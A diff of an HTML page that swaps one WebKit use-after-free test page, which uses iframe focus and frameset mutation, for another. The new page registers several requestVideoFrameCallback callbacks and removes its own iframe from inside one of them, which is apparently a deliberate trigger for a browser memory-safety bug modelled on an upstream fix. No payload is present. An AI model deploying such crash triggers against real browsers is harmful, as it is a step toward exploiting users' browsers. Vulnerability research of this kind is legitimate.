@@ -1,255 +1,184 @@
-<!doctype html>
+<!DOCTYPE html>
+<html>
+<head>
 <meta charset="utf-8">
-<title>WebKit RenderTree UAF B3 - phase isolation</title>
+<title>RVFC target</title>
+</head>
 
-<style>
-  body { font-family: monospace; margin: 0; }
-  #status {
-    position: fixed; top: 0; left: 0; right: 0; z-index: 99999;
-    background: white; border-bottom: 1px solid black;
-    padding: 6px; white-space: nowrap; overflow: hidden;
-  }
-  #log { margin-top: 42px; white-space: pre-wrap; }
-  #area { margin: 20px; }
-  iframe {
-    content: url();
-    zoom: 0.01;
-    width: 700px;
-    height: 300px;
-    border: 2px solid red;
-  }
-  button { margin: 4px; padding: 8px 12px; }
-  #box {
-    width: 800px; height: 260px; border: 2px solid #777;
-    margin: 20px 0;
-  }
-</style>
+<body>
 
-<div id="status">BOOT</div>
+<video
+    id="video"
+    autoplay
+    muted
+    playsinline
+    loop
+    width="320"
+    height="240">
 
-<div id="area">
-  <button id="exact">Run upstream-shaped sequence</button>
-  <button id="control">Run control sequence</button>
-  <button id="clear">Reset</button>
+    <source src="video.mp4" type="video/mp4">
 
-  <div id="box">
-    <iframe id="i0" tabindex="0"></iframe>
-  </div>
-
-  <div id="baseline">RenderTree baseline</div>
-  <div id="log"></div>
-</div>
+</video>
 
 <script>
+
 (function () {
-    var status = document.getElementById("status");
-    var logEl = document.getElementById("log");
-    var i0 = document.getElementById("i0");
-    var box = document.getElementById("box");
-    var baseline = document.getElementById("baseline");
 
-    var log = [];
-    var running = false;
+    var video = document.getElementById("video");
 
-    function mark(s) {
-        log.push((new Date().getTime()) + " " + s);
-        status.textContent = log[log.length - 1];
-        logEl.textContent = log.join("\n");
-    }
+    function log(message) {
 
-    function layoutProbe() {
-        document.documentElement.offsetHeight;
-        document.body.offsetHeight;
-        box.getBoundingClientRect();
-        i0.getBoundingClientRect();
-        baseline.getBoundingClientRect();
-    }
-
-    function reset() {
-        running = false;
-        log = [];
-        status.textContent = "RESET";
-        logEl.textContent = "";
-        location.hash = "";
         try {
-            i0.blur();
-            i0.src = "about:blank";
-        } catch (e) {}
+            console.log(message);
+        } catch (e) {
+        }
+
     }
 
     /*
-     * Continuous event-loop heartbeat.
+     * Verificação da API.
+     */
+
+    if (typeof video.requestVideoFrameCallback !== "function") {
+
+        log("RVFC unavailable inside iframe");
+
+        try {
+            parent.removeTargetFrame();
+        } catch (e) {
+        }
+
+        return;
+    }
+
+    log("RVFC available.");
+
+    /*
+     * Registramos vários callbacks.
      *
-     * If the browser remains responsive after a phase, the heartbeat
-     * continues. If the phase causes a renderer/event-loop stall,
-     * the last visible phase is useful evidence.
+     * A sequência é propositalmente:
+     *
+     * callback #1
+     * callback #2 -> remove iframe
+     * callback #3
+     * callback #4
+     * callback #5
+     * callback #6
+     * callback #7
+     *
+     * Isto segue a lógica estrutural do commit.
      */
-    function heartbeat() {
-        if (!running)
-            return;
 
-        mark("HEARTBEAT");
+    video.requestVideoFrameCallback(function(now, metadata) {
 
-        setTimeout(heartbeat, 1000);
-    }
+        log("RVFC callback #1");
 
-    /*
-     * This is the closest web-content approximation of the upstream
-     * regression test without WebKit-only internals.
-     */
-    function runExact() {
-        if (running)
-            return;
+    });
 
-        running = true;
-        log = [];
-        mark("EXACT_START");
+
+    video.requestVideoFrameCallback(function(now, metadata) {
+
+        log("RVFC callback #2");
+
+        /*
+         * Gatilho principal.
+         *
+         * Remove o iframe durante a execução de
+         * serviceRequestVideoFrameCallbacks().
+         */
 
         try {
-            i0.src = "about:blank";
-            mark("IFRAME_READY");
+
+            parent.removeTargetFrame();
+
         } catch (e) {
-            mark("IFRAME_ERROR");
+
+            log("Error removing frame: " + e);
+
         }
 
-        setTimeout(function () {
-            mark("BEFORE_BASELINE_LAYOUT");
-            layoutProbe();
-            mark("AFTER_BASELINE_LAYOUT");
+    });
 
-            /*
-             * Same important DOM mutation as upstream.
-             */
-            try {
-                document.documentElement.appendChild(
-                    document.createElement("frameset")
-                );
-                mark("FRAMESET_ADDED");
-            } catch (e) {
-                mark("FRAMESET_ERROR");
-            }
 
-            i0.onfocus = function () {
-                mark("FOCUS_ENTER");
+    video.requestVideoFrameCallback(function(now, metadata) {
 
-                try {
-                    location.hash = "y";
-                    mark("HASH_Y");
-                } catch (e) {
-                    mark("HASH_Y_ERROR");
-                }
+        log("RVFC callback #3");
 
-                mark("BEFORE_FOCUS_LAYOUT");
-                layoutProbe();
-                mark("AFTER_FOCUS_LAYOUT");
+    });
 
-                /*
-                 * Important diagnostic boundary:
-                 * if this timer fires, the event loop returned normally
-                 * from the focus/layout path.
-                 */
-                setTimeout(function () {
-                    mark("FOCUS_RETURN_TIMER");
 
-                    try {
-                        layoutProbe();
-                        mark("POST_FOCUS_TIMER_LAYOUT");
-                    } catch (e) {
-                        mark("POST_FOCUS_TIMER_LAYOUT_ERROR");
-                    }
-                }, 250);
-            };
+    video.requestVideoFrameCallback(function(now, metadata) {
 
-            try {
-                location.hash = "x";
-                mark("HASH_X");
-            } catch (e) {
-                mark("HASH_X_ERROR");
-            }
+        log("RVFC callback #4");
 
-            /*
-             * Promise is used instead of the original Cache API.
-             */
-            try {
-                Promise.resolve().then(function () {
-                    mark("PROMISE_CALLBACK");
+    });
 
-                    try {
-                        i0.focus();
-                        mark("FOCUS_CALLED");
-                    } catch (e) {
-                        mark("FOCUS_ERROR");
-                    }
-                });
 
-                mark("PROMISE_SCHEDULED");
-            } catch (e) {
-                mark("PROMISE_ERROR");
-            }
+    video.requestVideoFrameCallback(function(now, metadata) {
 
-        }, 500);
+        log("RVFC callback #5");
 
-        heartbeat();
-    }
+    });
+
+
+    video.requestVideoFrameCallback(function(now, metadata) {
+
+        log("RVFC callback #6");
+
+    });
+
+
+    video.requestVideoFrameCallback(function(now, metadata) {
+
+        log("RVFC callback #7");
+
+    });
+
 
     /*
-     * Control: same iframe/focus/layout activity, but NO frameset
-     * insertion and NO hash mutation. This helps determine whether
-     * the interesting boundary is specifically frameset/navigation
-     * interaction or simply iframe focus/layout.
+     * Inicia a reprodução.
+     *
+     * O vídeo deve efetivamente gerar frames para que os
+     * VideoFrameCallbacks sejam atendidos.
      */
-    function runControl() {
-        if (running)
-            return;
 
-        running = true;
-        log = [];
-        mark("CONTROL_START");
+    var playResult;
 
-        try {
-            i0.src = "about:blank";
-            mark("IFRAME_READY");
-        } catch (e) {
-            mark("IFRAME_ERROR");
-        }
+    try {
 
-        setTimeout(function () {
-            mark("CONTROL_BEFORE_LAYOUT");
-            layoutProbe();
-            mark("CONTROL_AFTER_LAYOUT");
+        playResult = video.play();
 
-            i0.onfocus = function () {
-                mark("CONTROL_FOCUS_ENTER");
+    } catch (e) {
 
-                layoutProbe();
-                mark("CONTROL_FOCUS_LAYOUT");
+        log("video.play() threw: " + e);
 
-                setTimeout(function () {
-                    mark("CONTROL_FOCUS_RETURN_TIMER");
-                }, 250);
-            };
-
-            Promise.resolve().then(function () {
-                mark("CONTROL_PROMISE_CALLBACK");
-
-                try {
-                    i0.focus();
-                    mark("CONTROL_FOCUS_CALLED");
-                } catch (e) {
-                    mark("CONTROL_FOCUS_ERROR");
-                }
-            });
-
-            mark("CONTROL_PROMISE_SCHEDULED");
-        }, 500);
-
-        heartbeat();
     }
 
-    document.getElementById("exact").onclick = runExact;
-    document.getElementById("control").onclick = runControl;
-    document.getElementById("clear").onclick = reset;
+    if (playResult && typeof playResult.catch === "function") {
 
-    mark("READY");
+        playResult.catch(function(error) {
+
+            log("video.play() failed: " + error);
+
+            /*
+             * Sem reprodução não haverá frames/RVFC.
+             *
+             * Removemos o iframe para evitar que o
+             * controlador fique esperando indefinidamente.
+             */
+
+            try {
+                parent.removeTargetFrame();
+            } catch (e) {
+            }
+
+        });
+
+    }
+
 })();
+
 </script>
+
+</body>
+</html>
